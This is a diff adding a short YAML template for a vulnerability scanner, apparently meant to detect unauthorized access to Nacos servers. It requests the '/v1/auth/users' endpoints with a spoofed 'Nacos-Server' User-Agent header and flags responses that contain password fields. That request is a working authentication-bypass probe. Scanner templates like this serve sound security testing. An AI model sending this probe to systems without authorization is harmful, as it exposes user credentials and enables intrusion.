@@ -1,0 +1,18 @@
+id: Nacos_noauth
+info:
+  name: Nacos 未授权访问
+  finger: Nacos
+  severity: info
+  tags:
+  - legacy
+  - noauth
+transport: http
+requests:
+- method: GET
+  paths:
+  - /v1/auth/users?pageNo=1&pageSize=10
+  - /nacos/v1/auth/users?pageNo=1&pageSize=10
+  expression: '!contains(body, "<") && contains(body, ''"pageNumber"'') && contains(body,
+    ''"password"'')'
+  headers:
+    User-Agent: Nacos-Server
